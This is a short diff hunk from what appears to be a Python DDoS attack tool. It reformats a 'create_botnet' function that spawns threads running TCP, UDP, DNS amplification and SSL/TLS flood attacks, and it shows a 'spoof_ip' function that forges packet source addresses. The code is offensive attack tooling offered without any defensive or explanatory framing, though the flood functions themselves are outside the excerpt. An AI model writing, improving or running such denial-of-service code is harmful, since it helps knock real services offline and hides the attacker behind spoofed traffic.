@@ -164,7 +164,14 @@ def ssl_tls_flood():
         except:
             pass
 
-def create_botnet(num_bots): with concurrent.futures.ThreadPoolExecutor() as executor: for _ in range(num_bots): executor.submit(ddos_tcp) executor.submit(ddos_udp) executor.submit(dns_amplification_attack) executor.submit(ssl_tls_flood)
+
+def create_botnet(num_bots):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        for _ in range(num_bots):
+            executor.submit(ddos_tcp)
+            executor.submit(ddos_udp)
+            executor.submit(dns_amplification_attack)
+            executor.submit(ssl_tls_flood)
 
 def spoof_ip(packet):
     packet[IP].src = random.choice(source_ips)
